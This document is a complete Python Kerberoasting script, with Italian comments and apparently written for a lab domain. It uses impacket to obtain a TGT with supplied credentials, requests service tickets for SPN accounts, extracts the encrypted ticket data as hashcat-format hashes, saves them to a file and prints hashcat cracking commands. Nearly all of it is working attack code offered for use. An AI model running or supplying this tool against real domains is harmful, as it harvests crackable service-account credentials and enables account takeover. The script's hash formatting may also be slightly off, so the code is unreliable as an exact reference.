#!/usr/bin/env python3
"""
Kerberoasting Script - kerberoast.py
Richiede TGS per service account con SPN ed estrae hash crackabili.

Teoria Kerberoasting:
    Qualsiasi utente autenticato nel dominio può richiedere un TGS (Ticket Granting
    Service) per qualsiasi servizio registrato con un SPN. Questo è by design,
    non è un bug — il sistema assume che solo il servizio legittimo possa decifrare
    il ticket.

    Il problema: il TGS è criptato con la password del service account.
    Se quella password è debole, puoi crackare l'hash offline esattamente come
    con AS-REP Roasting.

    Differenza chiave con AS-REP Roasting:
    - AS-REP: non servono credenziali, ma serve che il target abbia pre-auth disabilitata
    - Kerberoasting: servono credenziali valide (anche low-privilege), ma QUALSIASI
      service account con SPN è potenzialmente target
"""

import argparse
import json
import sys

from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.asn1 import TGS_REQ, TGS_REP, AP_REQ, seq_set, seq_set_iter, Authenticator
from impacket.krb5.crypto import Key, _enctype_table
from pyasn1.type.univ import noValue
from pyasn1.codec.der import decoder, encoder
import datetime
import random


def load_targets(enum_file):
    """
    Carica i target Kerberoasting dal file JSON dell'enumerazione.
    Sono gli account con SPN registrato.
    """
    with open(enum_file, 'r') as f:
        data = json.load(f)

    targets = data.get('kerberoast_targets', [])

    if not targets:
        print("[-] Nessun target Kerberoasting trovato nel file di enumerazione.")
        sys.exit(1)

    print(f"[+] Caricati {len(targets)} target dal file di enumerazione")
    return targets


def get_tgt(dc_ip, domain, username, password):
    """
    Ottiene un TGT con credenziali valide.
    Serve come "biglietto d'ingresso" per poi richiedere TGS.
    """
    domain_upper = domain.upper()
    client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    try:
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=client_name,
            password=password,
            domain=domain_upper,
            lmhash='',
            nthash='',
            kdcHost=dc_ip,
        )
        print(f"[+] TGT ottenuto per {username}@{domain_upper}")
        return tgt, cipher, session_key
    except Exception as e:
        print(f"[-] Impossibile ottenere TGT: {e}")
        sys.exit(1)


def request_tgs(dc_ip, domain, tgt, cipher, session_key, spn):
    """
    Richiede un TGS per un servizio specifico (SPN).

    Come funziona:
    1. Abbiamo già un TGT (ottenuto con credenziali valide)
    2. Costruiamo un TGS-REQ che dice "voglio accedere a questo servizio"
    3. Il DC ci dà un TGS criptato con la password del service account
    4. Estraiamo l'hash dal TGS
    """
    from impacket.krb5.kerberosv5 import getKerberosTGS

    domain_upper = domain.upper()

    # Parsa l'SPN per estrarre il service name
    # Es: MSSQLSvc/DC01.psychosec.local:1433 → ['MSSQLSvc', 'DC01.psychosec.local:1433']
    spn_parts = spn.split('/')

    server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

    try:
        tgs, tgs_cipher, old_session_key, session_key = getKerberosTGS(
            serverName=server_name,
            domain=domain_upper,
            kdcHost=dc_ip,
            tgt=tgt,
            cipher=cipher,
            sessionKey=session_key,
        )

        # Decodifica il TGS per estrarre l'hash
        tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = tgs_rep['ticket']['enc-part']
        etype = int(enc_part['etype'])
        cipher_data = bytes(enc_part['cipher']).hex()

        # Formatta hash per Hashcat
        if etype == 23:
            # RC4-HMAC → Hashcat mode 13100
            hash_str = f"$krb5tgs$23$*{spn}*${domain_upper}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
        elif etype == 17:
            # AES128 → Hashcat mode 19600
            hash_str = f"$krb5tgs$17${domain_upper}${spn}*${cipher_data}"
        elif etype == 18:
            # AES256 → Hashcat mode 19700
            hash_str = f"$krb5tgs$18${domain_upper}${spn}*${cipher_data}"
        else:
            hash_str = f"$krb5tgs${etype}${domain_upper}${spn}*${cipher_data}"

        print(f"  [+] {spn} - TGS hash catturato! (etype {etype})")
        return hash_str, etype

    except KerberosError as e:
        print(f"  [-] {spn} - Errore Kerberos: {e}")
        return None, None
    except Exception as e:
        print(f"  [-] {spn} - Errore: {e}")
        return None, None


def save_hashes(hashes, output_file):
    """
    Salva gli hash TGS in un file.
    """
    with open(output_file, 'w') as f:
        for h, _ in hashes:
            f.write(h + '\n')

    # Determina il mode hashcat in base all'etype
    etypes = set(e for _, e in hashes)

    print(f"\n[+] {len(hashes)} hash salvati in {output_file}")
    print(f"\n[*] Per crackare gli hash:")

    if 23 in etypes:
        print(f"    hashcat -m 13100 {output_file} /path/to/wordlist.txt")
    if 17 in etypes:
        print(f"    hashcat -m 19600 {output_file} /path/to/wordlist.txt")
    if 18 in etypes:
        print(f"    hashcat -m 19700 {output_file} /path/to/wordlist.txt")


def main():
    parser = argparse.ArgumentParser(
        description='Kerberoasting - Cattura hash TGS da service account con SPN',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi:
  python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u f.conti -p Password123!
  python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u f.conti -p Password123! --spns MSSQLSvc/DC01.psychosec.local:1433
        """
    )

    parser.add_argument('--dc-ip', required=True, help='IP del Domain Controller')
    parser.add_argument('--domain', required=True, help='Nome dominio')
    parser.add_argument('-u', '--username', required=True, help='Username autenticato')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('--enum-file', default='enum_results.json', help='File JSON enumerazione')
    parser.add_argument('--spns', nargs='+', help='Lista manuale di SPN target')
    parser.add_argument('-o', '--output', default='tgs_hashes.txt', help='File output (default: tgs_hashes.txt)')

    args = parser.parse_args()

    print("""
    ╔══════════════════════════════════════════╗
    ║       KERBEROASTING v1.0                 ║
    ║       Target: {:<26s}║
    ╚══════════════════════════════════════════╝
    """.format(args.dc_ip))

    # 1. Ottieni TGT con credenziali fornite
    print("[*] Ottengo TGT...")
    tgt, cipher, session_key = get_tgt(args.dc_ip, args.domain, args.username, args.password)

    # 2. Carica target SPN
    if args.spns:
        spn_list = args.spns
        print(f"[+] SPN manuali: {', '.join(spn_list)}")
    else:
        targets = load_targets(args.enum_file)
        spn_list = []
        for t in targets:
            spn_list.extend(t['spn'])
        print(f"[+] SPN da enumerazione: {', '.join(spn_list)}")

    print(f"\n[*] Avvio Kerberoasting su {len(spn_list)} SPN...\n")

    # 3. Richiedi TGS per ogni SPN
    hashes = []
    for spn in spn_list:
        h, etype = request_tgs(args.dc_ip, args.domain, tgt, cipher, session_key, spn)
        if h:
            hashes.append((h, etype))

    # 4. Salva risultati
    if hashes:
        save_hashes(hashes, args.output)
        print(f"\n[+] Kerberoasting completato: {len(hashes)}/{len(spn_list)} hash catturati!")
    else:
        print("\n[-] Nessun hash catturato.")


if __name__ == '__main__':
    main()
